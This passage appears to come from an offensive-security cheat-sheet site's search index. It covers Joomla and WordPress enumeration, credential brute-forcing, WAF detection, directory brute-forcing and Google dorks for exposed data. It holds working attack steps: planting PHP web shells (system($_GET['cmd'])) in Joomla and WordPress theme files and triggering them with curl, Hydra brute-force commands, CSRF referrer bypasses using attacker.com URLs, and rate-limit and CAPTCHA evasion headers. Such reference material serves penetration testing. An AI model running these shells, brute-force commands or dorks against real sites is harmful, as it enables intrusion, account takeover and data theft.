&lt;author&gt;Joomla! Project&lt;/author&gt;\n    &lt;creationDate&gt;April 2020&lt;/creationDate&gt;\n&lt;/extension&gt;\n</code></pre> </li> <li> <p>Check Version in Administrator Manifests: <code>curl -s http://[JOOMLA-DOMAIN]/administrator/manifests/files/joomla.xml | xmllint --format -</code></p> <pre><code>&lt;extension type=\"file\" version=\"3.9.22\" method=\"upgrade\"&gt;\n    &lt;name&gt;joomla&lt;/name&gt;\n    &lt;author&gt;Joomla! Project&lt;/author&gt;\n    &lt;creationDate&gt;September 2020&lt;/creationDate&gt; \n    &lt;description&gt;Joomla! Core Files&lt;/description&gt;\n&lt;/extension&gt;`\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Joomla/#automatic-scanning","title":"Automatic Scanning","text":"<ol> <li>Use Droopescan for automatic scanning: <code>droopescan scan joomla --url http://[JOOMLA-DOMAIN]/</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Joomla/#brute-forcing-login-credentials","title":"Brute Forcing Login Credentials","text":"<ol> <li>Using Hydra for Credential Brute-Forcing: <code>hydra -L users.txt -P passwds.txt [JOOMLA-DOMAIN] http-get /administrator/index.php</code></li> <li>Using joomla-brute.py for Credential Brute-Forcing: <code>sudo python3 joomla-brute.py -u http://[JOOMLA-DOMAIN] -w /usr/share/wordlist/rockyou.txt -usr admin</code></li> <li>Using Metasploit for Credential Brute-Forcing: <code>msf &gt; use auxiliary/scanner/http/joomla_bruteforce_login</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Joomla/#gain-rce-by-injecting-php-code-in-a-template","title":"Gain RCE by Injecting PHP Code in a Template","text":"<ol> <li>Navigate to Templates in Joomla Admin Panel.</li> <li>Select protostar from the Template list.</li> <li>Access the Templates: Customize page.</li> <li>Edit the error.php page and insert the following PHP code: <code>system($_GET['cmd']);</code></li> <li>Save the changes.</li> <li>Trigger the RCE with: <code>curl -s http://[JOOMLA-DOMAIN]/templates/protostar/error.php?cmd=id</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/WordPress/","title":"WordPress","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/WordPress/#introduction","title":"Introduction","text":"<p>WordPress is an open-source content management system (CMS) that enables users to create, manage, and modify content on a website without needing specialized technical knowledge. Originally launched in 2003 as a platform primarily for blogging, WordPress has evolved into a robust tool for building various types of websites, from simple blogs to comprehensive business sites and online stores.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/WordPress/#plugin-enumeration-techniques","title":"Plugin Enumeration Techniques","text":"<p>Vulnerable plugins are a primary attack vector in WordPress and represent a significant security risk.</p> <ol> <li> <p>Enumerating Plugins with WPScan: <code>wpscan --url https://[WORDPRESS-DOMAIN]/ -e vp --plugins-detection aggressive</code></p> </li> <li> <p>Identifying Plugins with a Custom Bash Script:</p> <pre><code>for plugin in $(cat pluginlist.txt); do \n  response=$(curl -s -o /dev/null -w \"%{http_code}\" https://[WORDPRESS-DOMAIN]/wp-content/plugins/$plugin/)\n  if [[ \"$response\" -eq 200 ]]; then \n    echo \"Plugin found: $plugin\"; \n  fi; \ndone\n</code></pre> </li> <li> <p>Detecting Plugins with Nmap Scripts: <code>nmap -sV --script http-wordpress-plugins https://[WORDPRESS-DOMAIN]/</code></p> </li> <li> <p>Scanning Plugins with Metasploit: <code>auxiliary/scanner/http/wordpress_plugins</code></p> </li> <li> <p>Brute Forcing Plugin Paths with Feroxbuster: <code>feroxbuster -u https://[WORDPRESS-DOMAIN]/wp-content/plugins -w plugins.txt</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/WordPress/#user-enumeration-techniques","title":"User Enumeration Techniques","text":"<ol> <li> <p>Enumerating Users with a Bash Script:</p> <pre><code>for i in {1..100}; do \n   curl -s -L -i https://[WORDPRESS-DOMAIN]/wordpress?author=$i | grep -E -o \"Location:.*\" | awk -F/ '{print $NF}'; \ndone\n</code></pre> </li> <li> <p>Bypassing Restrictions for User Enumeration: <code>http://[WORDPRESS-DOMAIN]/?x&amp;author=1</code></p> </li> <li> <p>Brut-forcing Usernames with Hydra: <code>hydra -L userlist.txt -p test \"https://[WORDPRESS-DOMAIN]/\" http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username\"</code></p> </li> <li> <p>Scanning Users with WPScan: <code>wpscan --url https://[WORDPRESS-DOMAIN]/ --enumerate u</code></p> </li> <li> <p>Enumerating Users with Metasploit: <code>use auxiliary/scanner/http/wordpress_enum_users</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/WordPress/#wpscan-commands","title":"WPScan Commands","text":"<ol> <li> <p>Performing a Comprehensive Website Scan: <code>wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://[WORDPRESS-DOMAIN]/ --plugins-detection aggressive --api-token [API-TOKEN] --passwords /usr/share/seclists/Passwords/probable-v2-top1575.txt</code></p> </li> <li> <p>Conducting a Detailed Vulnerability Scan: <code>wpscan --url https://[WORDPRESS-DOMAIN]/ --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/WordPress/#injecting-a-shell-into-a-wordpress-theme","title":"Injecting a Shell into a WordPress Theme","text":"<p>To establish a reverse shell through a WordPress theme, you modify theme files to execute arbitrary system commands. This can be done by adding PHP code to template files like <code>404.php</code> or <code>footer.php</code>. Follow these detailed steps to implement and use a reverse shell:</p> <ol> <li> <p>Choose a template file within the WordPress theme that is accessed frequently. For example, <code>footer.php</code> is included on every page, making it a good place.</p> </li> <li> <p>Insert the following PHP code at the top of the file: <code>&lt;?php system($_GET['hackfast']); ?&gt;</code></p> </li> <li> <p>Replace the original file with your modified version on your WordPress server. Make sure you back up the original file first in case you need to restore it later.</p> </li> <li> <p>To execute commands, Access the modified file through a browser or use a command-line tool like curl: <code>curl -s 'https://[WORDPRESS-DOMAIN]/path/to/modified/template?hackfast=[URL_ENCODED_COMMAND]'</code></p> </li> <li> <p>URL encode your commands to ensure they are interpreted correctly by the server. For instance, spaces are represented as <code>%20</code> and pipes <code>|</code> as <code>%7C</code>.</p> </li> <li> <p>Here an example of encoding and executing the command <code>id | grep uid | cut -f4 -d\"&gt;\"</code>: <code>curl -s https://[WORDPRESS-DOMAIN]/path/to/modified/template?hackfast=id%20%7C%20grep%20uid%20%7C%20cut%20-f4%20-d%22%3E%22</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Bypassing/Bypassing-CAPTCHA/","title":"Bypassing CAPTCHA","text":"<ol> <li>Response manipulation.</li> <li>Use previously used captcha value.</li> <li>Use any token with same length(+1/-1).</li> <li>Remove the param value or remove the entire parameter.</li> <li>Change method from POST to GET(or PUT) and remove the captcha.</li> <li>Change body to JSON or vice-versa.</li> <li>Try OCR.</li> <li>Check whether the captcha is in the source code. (Ex: 2+2)</li> <li>Check whether the value of the captcha is in the source code.</li> <li>Try to use the same captcha value several times with the different sessionIDs.</li> <li>JSON Body? Combine 6 and 5. Add headers: <pre><code>X-Forwarded-Host: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Host: 127.0.0.1\n</code></pre></li> </ol> <p>Todo</p>"},{"location":"Offensive-Security/Web-Application/Web-Bypassing/Bypassing-CSRF-Protection/","title":"Bypassing CSRF Protection","text":""},{"location":"Offensive-Security/Web-Application/Web-Bypassing/Bypassing-CSRF-Protection/#bypassing-csrf-protection","title":"Bypassing CSRF Protection","text":"<ol> <li>Remove the entire token parameter with value/Remove just the value.</li> <li>Use any other random but same length token.</li> <li>Use any other random (length-1) or (length+1) token.</li> <li>Use attacker's token in target session.</li> <li>Change the method from POST to GET and remove the token.</li> <li>If request is made through PUT or DELETE then try POST /profile/update?_method=PUT HTTP/1.1 or  <pre><code>POST /profile/update HTTP/1.1\nHost: example.com\n...\n\n_method=PUT\n</code></pre></li> <li>If token is sent through custom header; try to remove the header.</li> <li>Change the Content-Type to application/json, application/x-url-encoded or form-multipart, text/xml, application/xml.</li> <li>If double submit token is there (in cookies and some header) then try CRLF injection.</li> <li>Bypassing referrer check: i. If the referrer header is checked but only when it exists in the request then add this piece of code in your csrf poc: <code>&lt;meta name=\"referrer\" content=\"never\"&gt;</code> ii. Regex Referral bypass: <pre><code>https://attacker.com?target.com\nhttps://attacker.com;target.com\nhttps://attacker.com/target.com/../targetPATH\nhttps://target.com.attacker.com\nhttps://attackertarget.com\nhttps://target.com@attacker.com\nhttps://attacker.com#target.com\nhttps://attacker.com\\.target.com\nhttps://attacker.com/.target.com\n</code></pre></li> <li>CSRF token stealing via xss/htmli/cors.</li> <li>JSON Based: i. Change the Content-Type to text/plain, application/x-www-form-urlencoded, multipart/form-data and check if it accepts. ii. Use flash + 307 redirect.</li> <li>Guessable CSRF token.</li> <li>Clickjacking to strong CSRF token bypass.</li> <li>Type Juggling.</li> <li>Set the csrf token to \"null\" or add null bytes.</li> <li>Check whether csrf token is sent over http or sent to 3<sup>rd</sup> party. See here</li> <li>Generate multiple csrf tokens, observe the static part. Keep it as it is and play with the dynamic part.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Bypassing/Bypassing-Rate-Limit-Protection/","title":"Bypassing Rate Limit Protection","text":""},{"location":"Offensive-Security/Web-Application/Web-Bypassing/Bypassing-Rate-Limit-Protection/#bypassing-rate-limit-protection","title":"Bypassing Rate Limit Protection","text":"<ol> <li>Ip Rotator - If developer implemented rate limit in such a way that the application blocks the ip address of attacker after few requests, then you may try using IP Rotator to change your IP in each requests.</li> <li>Add the following headers in the request: <pre><code>X-Originating-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Host: 127.0.0.1\nX-Forwared-Host: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\n</code></pre> Instead of 127.0.0.1, try using 127.0.0.2, 127.0.0.3,... Even you can try using double X-Forwared-For header: <pre><code>X-Forwarded-For:\nX-Forwarded-For: 127.0.0.1\n</code></pre></li> <li>Try changing user-agent, cookies.</li> <li>Append null bytes (%00, %0d%0a, %0d, %0a, %09, %0C, %20) to the original endpoint (Ex: <code>POST /forgot-password%20 HTTP/1.1</code>).  Also try adding the bytes after the value of parameter (like <code>email=tuhin@gmail.com%20</code>)</li> <li>Race condition. Read this as a reference.</li> <li>Add any random parameter in the request. <pre><code>POST /forgot-password?fake=1 HTTP/1.1\nHost: target.com\n...\n\nemail=target@gmail.com&amp;alsofake=2\n</code></pre></li> <li>Change the request body (Form to JSON, XML or vice-versa).</li> <li>Change request methods (POST to PUT or GET).</li> <li>If developer implemented captcha based protection then try Captcha Bypass Techniques.</li> <li>Gmail + and . trick.</li> <li>Change api version (Ex: api/v2/1729/confirm-email to api/v1/1729/confirm-email).</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Detecting-WAF/","title":"Detecting WAF (Web Application Firewall)","text":""},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Detecting-WAF/#manual-techniques","title":"Manual Techniques","text":"<p>Web Application Firewalls (WAFs) are designed to protect web applications by filtering and monitoring HTTP traffic. They can block malicious requests such as SQL injections or cross-site scripting (XSS) attacks, and can interfere with security testing and enumeration.</p> Technique Description Example Analyze HTTP Responses Manually inspect HTTP responses for WAF-specific headers or messages. Use browser developer tools or a proxy tool like Burp Suite to inspect HTTP headers. Observe Response Codes Pay attention to HTTP response codes, particularly <code>403 Forbidden</code> Rate Limiting Detection Send a high number of requests in a short period to see if rate limiting is triggered, indicating WAF protection. Use tools like <code>Slowloris</code> or <code>Burp Suite Intruder</code>. Custom Error Pages Note if custom error pages are served when certain payloads are sent, which can indicate WAF intervention. A unique error page or message that differs from standard server error pages. Check Response Time Measure the response time of the web server. A significant delay in responses might indicate WAF processing. Use tools like OWASP ZAP or Burp Suite to automate response time analysis."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Detecting-WAF/#using-nmap","title":"Using Nmap","text":"<p>Nmap can detect and fingerprint Web Application Firewalls (WAFs) using the http-waf-detect script to identify WAF presence and the http-waf-fingerprint script to determine the WAF type.</p> Function Command Description Detect WAF <code>nmap -p80 --script http-waf-detect [host]</code> Detects the presence of a WAF. Fingerprint WAF <code>nmap -p80 --script http-waf-fingerprint [host]</code> Determines the type of WAF. Scan Multiple Ports <code>nmap -p80,443 --script http-waf-detect,http-waf-fingerprint [host]</code> Scans multiple ports to detect and fingerprint WAF."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Detecting-WAF/#using-wafw00f","title":"Using WAFW00F","text":"<p>WAFW00f is a tool specifically designed to identify and fingerprint WAFs by sending multiple requests and analyzing the responses. It supports a wide range of WAFs.</p> Function Command Description List Supported WAFs <code>wafw00f -l</code> Lists all WAFs supported by WAFW00f. Fingerprint WAF <code>wafw00f [url]</code> Fingerprints the WAF protecting a specific URL. Verbose Output <code>wafw00f -v [url]</code> Provides verbose output for detailed analysis. Output in JSON Format <code>wafw00f -o json [url]</code> Outputs the results in JSON format."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Detecting-WAF/#using-sqlmap","title":"Using SQLMap","text":"<p>SQLMap can be used to detect the presence of a WAF and even attempt to bypass it during SQL injection testing. The --identify-waf flag helps in identifying the WAF.</p> Function Command Description Detect and Bypass WAF <code>sqlmap --url=[url] --batch --identify-waf</code> Detects the presence of a WAF and attempts to bypass it during SQL injection testing. Set Custom HTTP Headers <code>sqlmap --url=[url] --headers=\"X-Forwarded-For: 127.0.0.1\"</code> Sets custom HTTP headers to potentially bypass WAF rules. Delay Between Requests <code>sqlmap --url=[url] --delay=5</code> Adds a delay between requests to avoid rate limiting by the WAF. Randomize User-Agent <code>sqlmap --url=[url] --random-agent</code> Randomizes the User-Agent header to evade detection."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Detecting-WAF/#using-burp-suite","title":"Using Burp Suite","text":"<p>Burp Suite can detect and fingerprint WAFs by using the Intruder tool to analyze response patterns for WAF activity and has extensions like WAF Detector to identify WAF signatures and behaviors automatically.</p> Function Description Initial Detection Use the Intruder tool in Burp Suite to send multiple payloads. Analyze the responses for patterns that indicate WAF activity, such as consistent blocking of certain types of requests. WAF Fingerprinting Use Burp Suite extensions like WAF Detector to automate the detection and fingerprinting process. These extensions leverage known signatures and behavioral patterns."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/","title":"Directory Brute-Forcing","text":""},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/#wordlist-types","title":"Wordlist Types","text":"<ol> <li>General-Purpose: Contains a broad range of common subdomain names (e.g., dev, staging, blog, mail, admin, test). Useful when the target's naming conventions are unknown.</li> <li>Targeted: Focused on specific industries, technologies, or naming patterns relevant to the target. More efficient and reduces false positives.</li> <li>Custom: Created based on specific keywords, patterns, or intelligence gathered from other sources.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/#using-gobuster","title":"Using Gobuster","text":"<ol> <li>Basic usage with a predefined wordlist: <code>gobuster dir -u [TARGET-URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 30</code> </li> <li>Using a big wordlist: <code>gobuster dir -u [TARGET-URL] -w /usr/share/wordlists/dirb/big.txt</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/#using-feroxbuster","title":"Using Feroxbuster","text":"<ol> <li> <p>Default usage with a common wordlist: <code>feroxbuster -u [TARGET-URL] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html</code></p> </li> <li> <p>Using a big wordlist: <code>feroxbuster -u [TARGET-URL] -w /usr/share/wordlists/dirb/big.txt -x php,txt,html</code></p> </li> <li> <p>Lowercase wordlist for Windows: <code>feroxbuster -u [TARGET-URL] --no-recursion -k -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</code></p> </li> <li> <p>For ASP.NET/IIS servers: <code>feroxbuster -u [TARGET-URL] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x aspx</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/#using-dirsearch","title":"Using Dirsearch","text":"<ol> <li> <p>Basic usage: <code>dirsearch -u [TARGET-URL] -w /usr/share/dirb/wordlists/common.txt</code></p> </li> <li> <p>With multiple extensions: <code>dirsearch -u [TARGET-URL] -e sh,txt,htm,php,cgi,html,pl,bak,old</code></p> </li> <li> <p>Custom wordlist: <code>dirsearch -u [TARGET-URL] -e sh,txt,htm,php,cgi,html,pl,bak,old -w path/to/wordlist</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/#using-ffuf","title":"Using FFUF","text":"<ol> <li>Using a common wordlist: <code>ffuf -u [TARGET-URL]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Directory-Brute-Forcing/#using-dirb","title":"Using Dirb","text":"<ol> <li> <p>Basic usage: <code>dirb [TARGET-URL] /path/to/wordlist</code></p> </li> <li> <p>With multiple extensions: <code>dirb [TARGET-URL] /usr/share/wordlists/dirb/big.txt -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/","title":"Google Dorks","text":""},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#introduction","title":"Introduction","text":"<p>Google Dorks Used advanced search syntax to find specific information on the internet. This table lists various search queries, known as \"Google Dorks,\" that are used to identify potential security exposures in server configurations.</p>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#server-configurations-and-exposures","title":"Server Configurations and Exposures","text":"Google Dork Description Example Use-Case <code>intitle:\"Apache2 Ubuntu Default Page: It works\"</code> Searches for Apache default installation page on Ubuntu servers. Used to find unsecured servers needing configuration. <code>inurl:\"server-status\" intitle:\"Apache Status\" intext:\"Apache Server Status for\"</code> Finds pages displaying Apache server status. Helps identify servers potentially exposing sensitive operational data. <code>filetype:conf inurl:firewall -intitle:cvs</code> Locates firewall configuration files. Used to check for insecure firewall settings that are publicly accessible. <code>inurl:Dashboard.jspa intext:\"Atlassian Jira Project Management Software\"</code> Searches for Atlassian Jira dashboards. Identifies companies using Jira and possibly exposes project management practices. <code>intitle:\"IIS Windows Server\" -inurl:\"IIS Windows Server\"</code> Finds Microsoft IIS servers without the default page in the URL. Used to discover IIS servers that might be poorly configured. <code>inurl:app/kibana intext:Loading Kibana</code> Locates Kibana applications in use. Finds exposed Kibana dashboards which may reveal insights into log analytics. <code>intitle:\"Swagger UI - \" + \"Show/Hide\"</code> Finds Swagger UI endpoints. Used to uncover API endpoints, potentially revealing API methods and data structures. <code>inurl:/filedown.php?file=</code> Searches for file download PHP scripts. Identifies direct file download links that could be unsecured. <code>intitle:\"Webmin *\" \"login\" \"Username\" -filetype:html</code> Finds login pages for Webmin server management. Pinpoints Webmin panels that may allow unauthorized access if unsecured. <code>inurl:/phpMyAdmin/index.php server=*</code> Finds phpMyAdmin interfaces with server parameters. Detects openly accessible database management interfaces that might be exploitable."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#database-and-file-exposures","title":"Database and File Exposures","text":"Google Dork Description Example Use-Case <code>ext:(doc \\| pdf \\| xls \\| txt \\| ps \\| rtf \\| odt \\| sxw \\| psw \\| ppt \\| pps \\| xml) (intext:confidential salary \\| intext:\"budget approved\") inurl:confidential</code> Searches for sensitive documents marked as confidential containing salaries or budget information. Used to locate leaked financial documents which could expose personal or corporate financial data. <code>filetype:SWF SWF</code> Finds Adobe Flash SWF files. Used to identify outdated or potentially vulnerable Flash content on websites. <code>filetype:TXT TXT</code> Locates plain text files. Often used to find exposed configuration files or logs that contain sensitive information. <code>filetype:XLS XLS</code> Searches for Excel spreadsheet files. Helps in locating spreadsheets that might contain personal data, financial figures, or internal data. <code>filetype:pdf \"Assessment Report\" nessus</code> Finds Nessus assessment report PDFs. Used to uncover security assessment reports which might disclose vulnerabilities. <code>\"index of\" \"database.sql.zip\"</code> Searches for zipped SQL database backups. Locates exposed database backups which can be downloaded without authentication. <code>intitle:index.of.?.sql</code> Finds directory listings of SQL files. Used to discover unprotected databases available directly via the browser. <code>filetype:url +inurl:\"ftp://\" +inurl:\";@\"</code> Searches for URL files containing FTP credentials. Identifies FTP access details that are inadvertently exposed online. <code>s3 site:amazonaws.com filetype:log</code> Finds Amazon S3 log files. Used to spot exposed log files on S3 buckets that might contain sensitive operational data. <code>intext:\"@gmail.com\" AND intext:\"@yahoo.com\" filetype:sql</code> Searches for SQL files containing personal email addresses. Detects databases dumped online which include user email addresses, potentially for data breach analysis. <code>intitle:\"index of\" \"/aws.s3/\"</code> Finds directories listing content from AWS S3 buckets. Used to identify open S3 buckets with possibly sensitive stored data. <code>inurl:/_cat/indices?v</code> Searches for Elasticsearch indices information. Used to locate exposed Elasticsearch clusters that might reveal a wealth of structured data."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#login-portals-and-authentication-exposures","title":"Login Portals and Authentication Exposures","text":"Google Dork Description Example Use-Case <code>site:*/auth intitle:login</code> Searches for login pages across various domains containing '/auth' in the URL. Used to identify accessible login pages that could be targeted for password attacks. <code>inurl: admin/login.aspx</code> Finds login pages specifically for admin portals using ASP.NET. Utilized to pinpoint administrative login portals that may have weaker security settings. <code>inurl:cgi/login.pl</code> Locates login pages executed by Perl CGI scripts. Used to detect outdated or potentially insecure Perl-based authentication pages. <code>inurl:zoom.us/j and intext:scheduled for</code> Searches for publicly accessible Zoom meeting links and schedules. Helps in finding Zoom meetings that could be accessed without proper invitations. <code>inurl:office365 AND intitle:\"Sign In \\| Login \\| Portal\"</code> Finds login portals for Office 365 services. Used by security professionals to audit for phishing pages that mimic Office 365 login portals. <code>inurl:'/scopia/entry/index.jsp'</code> Locates login pages for Scopia\u00a0 video conferencing tools. Identifies potential entry points into video conference systems that could be exploited. <code>inurl:\"/vpn/tmindex.html\"</code> Searches for specific VPN login pages. Find exposed VPN services that might allow unauthorized access if compromised."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#miscellaneous-exposures","title":"Miscellaneous Exposures","text":"Google Dork Description Example Use-Case <code>intitle:\"qBittorrent Web UI\" inurl:8080</code> Finds instances of the qBittorrent web interface, typically hosted on port 8080. Used to identify unprotected qBittorrent interfaces that could allow unauthorized access to torrent downloads. <code>site:https://docs.google.com/spreadsheets edit</code> Searches for publicly editable Google Spreadsheets. Utilized to find spreadsheets that are inadvertently exposed and could be modified by unauthorized users. <code>intitle:\"index of\" unattend.xml</code> Locates directories containing unattend.xml files, which automate Windows setup processes. Used to discover unsecured Windows deployment files that could expose sensitive setup parameters. <code>intitle: \"index of\" \"./\" \"./bitcoin\"</code> Finds directories that could potentially contain Bitcoin wallet files or related information. Helps in identifying potentially exposed Bitcoin-related files for security checks or recovery. <code>inurl:\"/index.aspx/login\"</code> Searches for login pages associated with ASP.NET web applications. Aids in locating ASP.NET login portals that may be vulnerable to attacks. <code>inurl:\"/wp-content/uploads/\" intext:\"web.config\" intitle:\"Index of\"</code> Finds instances where the 'web.config' file for Windows servers might be exposed in WordPress uploads directories. Used to detect exposed server configuration files which could compromise a website's security."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#automating-google-dork-queries","title":"Automating Google Dork Queries","text":"<p>Automating search queries enhances efficiency and coverage. Tools and scripts can rapidly scan for multiple queries, identifying potential exposures quickly and systematically.</p>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#goofuzz","title":"GooFuzz","text":"<p>GooFuzz is a fast, Go-based tool with a variety of flags for efficient dorking. Follow these steps to install and use it:</p> <ol> <li>Clone the repository: <code>sudo git clone https://github.com/m3n0sd0n4ld/GooFuzz</code></li> <li>Navigate to the directory: <code>cd GooFuzz</code></li> <li>Copy the binary to your local bin: <code>sudo cp GooFuzz /usr/local/bin/</code></li> <li>Display the help menu for more information : <code>GooFuzz -h</code></li> <li>Run GooFuzz with specified options: <code>GooFuzz -t target.com -e pdf,doc,bak</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#godork","title":"GoDork","text":"<p>go-dork supports multiple search engines, making it ideal for comprehensive dork scanning. Follow these steps to get started:</p> <ol> <li>Clone the repository: <code>sudo git clone https://github.com/dwisiswant0/go-dork.git</code></li> <li>Navigate to the directory: <code>cd go-dork</code></li> <li>Build the binary: <code>sudo go build</code></li> <li>Copy the binary to your local bin: <code>sudo cp go-dork /usr/local/bin/</code></li> <li>Perform a dork scan with a specific query: <code>go-dork -q \"inurl:'testTarget'\"</code></li> <li>Specify a search engine and query: <code>go-dork -e google -q \".php?id=\"</code></li> <li>Use a list of dorks from a file: <code>cat dorks.txt | go-dork -p 5</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Google-Dorks/#google-dork-scanning-script","title":"Google Dork Scanning Script","text":"<p>A simple shell script for rapid Google Dork scanning:</p> <ol> <li>Clone the repository: <code>git clone https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan.git</code></li> <li>Navigate to the directory: <code>cd Fast-Google-Dorks-Scan/</code></li> <li>Make the script executable: <code>chmod +x FGDS.sh</code></li> <li>Run the script: <code>./FGDS.sh target.com</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/","title":"Readme","text":""},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#data-transmission-methods","title":"Data Transmission Methods","text":"<p>Understanding how data is transmitted within applications is essential for spotting potential vulnerabilities that could lead to data interception or manipulation. This section explores common methods.</p> Method Description Example URL Parameters Data included directly in the URL. <code>resource?parameter=value&amp;parameter2=value2</code> RESTful Routing Data transmitted through structured URLs representing API paths. <code>Method /route/resource/subresource/parameter</code> API Endpoints Specific endpoints handle data requests via various HTTP methods. POST to <code>/api/users</code> for creating users"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#practices-for-effective-testing","title":"Practices for Effective Testing","text":"Tips Description Explore Every Endpoint When using tools like Burp Suite, ensure that you explore every button and feature to understand their functions fully. This will help you capture all possible endpoints during your testing. Wordlists in API Testing If you're testing APIs, consider using diffrent wordlists to discover hidden or undocumented endpoints that might be vulnerable. Analyze HTTP Headers Pay attention to HTTP headers, which can reveal useful information about the technology stack and potential vulnerabilities. Tips &amp; Tricks <p>the key to effective testing is not just to click all the buttons but to understand what each button does and how it can be leveraged to improve your testing outcomes.</p>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#data-storage-locations","title":"Data Storage Locations","text":"<p>Identifying where user data is stored is fundamental in determining potential breach points. Here are common storage types and their associated security considerations:</p> Storage Type USAGE Details Cookies Manage user sessions and preferences. Test for XSS vulnerabilities, check security flags. API Calls Data exchange between client and server. Can be intercepted if not secured with HTTPS. Databases Stores user and application data. Focus on SQL injection, access controls. Local Storage Stores data in the user's browser persistently. Vulnerable to client-side scripting attacks,verify encryption. Session Storage Similar to local storage but expires with the session. Data cleared when the browser tab is closed."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#data-reference-methods","title":"Data Reference Methods","text":"<p>Understanding how user data is referenced within the system</p> Reference Type Description Use Case UID Simple numeric or alphanumeric identifier. Commonly used as primary keys in databases. UUID A universally unique identifier provides better security. Used when more security and uniqueness are required. Email Commonly used as a unique identifier for users. Used For user authentication systems. Username Primary identifier for user interactions and personalization. Often paired with passwords to manage account access"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#user-levels-and-multi-tenancy","title":"User Levels and Multi-Tenancy","text":"<p>Analyzing user access levels is essential for identifying and preventing unauthorized access and privilege escalation.</p> User Level Access Rights Admin Full control over all application functionalities User Access to standard features relevant to routine operations Guest Limited access, typically without authentication"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#application-framework-and-libraries","title":"Application Framework and Libraries","text":"<p>Understanding the frameworks and libraries an application utilizes is crucial for pinpointing specific vulnerabilities</p> Component Description Common Issues Frameworks Examples: Django, Ruby on Rails, Express.js Version-specific vulnerabilities, insecure defaults, outdated components Libraries jQuery, React outdated versions, well-known security flaws, lack of regular updates"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#configuration-and-environment-settings","title":"Configuration and Environment Settings","text":"<p>Misconfigurations are common sources of vulnerabilities in web applications, often leading to serious security breaches.</p> Aspect Description Security Risks Deployment Settings Configuration details for live deployment environments. Misconfigurations here can expose the entire application to unauthorized access or data leakage. Server Settings How servers are set up to host applications and manage requests. Improper settings may expose servers to various attacks. Environment Variables Used to manage sensitive data such as API keys and database credentials. Exposure through code leaks or server misconfigurations can lead to data breaches. File Permissions Access controls for reading, writing, and executing files on the server. Incorrect permissions can lead to unauthorized file access and execution,. Security Policies Framework of rules managing how application resources are accessed and used. Weak policies can lead to exploitation and data loss. Tips &amp; Tricks <p>The primary goal is to understand the functionality of the target system and gain the necessary knowledge to communicate with it and exploit it for our purposes effectively.</p>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Readme/#types-of-hosting-environments","title":"Types of Hosting Environments","text":"<p>Different hosting environments come with varying security implications.</p> Hosting Type Description Security implications Shared Hosting Multiple websites hosted on a single server. 